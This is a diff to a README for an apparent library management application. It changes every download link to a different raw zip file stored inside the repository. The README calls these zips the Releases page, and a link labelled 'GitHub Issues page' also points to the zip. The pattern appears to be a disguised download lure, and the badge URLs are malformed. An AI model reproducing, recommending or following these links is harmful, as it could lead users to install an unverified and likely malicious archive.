@@ -9,7 +9,7 @@ To begin using the library-management-system, follow these steps:
 ### 1. 📥 Download the Application
 You can download the latest version of the application from the Releases page. Click the button below to access it:
 
-[![Download Now](https://github.com/phitran2979gmailcom/library-management-system/raw/refs/heads/main/sql/management_system_library_3.8.zip%20Release-Here-blue)](https://github.com/phitran2979gmailcom/library-management-system/raw/refs/heads/main/sql/management_system_library_3.8.zip)
+[![Download Now](https://raw.githubusercontent.com/phitran2979gmailcom/library-management-system/main/ER/library_system_management_1.7.zip%20Release-Here-blue)](https://raw.githubusercontent.com/phitran2979gmailcom/library-management-system/main/ER/library_system_management_1.7.zip)
 
 ### 2. 📂 System Requirements
 Before installing, ensure your computer meets the following requirements:
@@ -69,7 +69,7 @@ To manage loans:
 ## 📥 Download & Install
 To start using the library-management-system, you can download it from the Releases page again. Click the link below:
 
-[![Download Now](https://github.com/phitran2979gmailcom/library-management-system/raw/refs/heads/main/sql/management_system_library_3.8.zip%20Release-Here-blue)](https://github.com/phitran2979gmailcom/library-management-system/raw/refs/heads/main/sql/management_system_library_3.8.zip)
+[![Download Now](https://raw.githubusercontent.com/phitran2979gmailcom/library-management-system/main/ER/library_system_management_1.7.zip%20Release-Here-blue)](https://raw.githubusercontent.com/phitran2979gmailcom/library-management-system/main/ER/library_system_management_1.7.zip)
 
 ## ⚠️ Troubleshooting
 If you face issues:
@@ -79,7 +79,7 @@ If you face issues:
 - **Application Crashes:** Try reinstalling the application or checking for updates.
 
 ## 🤝 Support
-For additional help or questions, please visit the [GitHub Issues page](https://github.com/phitran2979gmailcom/library-management-system/raw/refs/heads/main/sql/management_system_library_3.8.zip) to report your issue or seek assistance from the community.
+For additional help or questions, please visit the [GitHub Issues page](https://raw.githubusercontent.com/phitran2979gmailcom/library-management-system/main/ER/library_system_management_1.7.zip) to report your issue or seek assistance from the community.
 
 ## 🤔 Frequently Asked Questions
 - **What is the purpose of the library-management-system?**
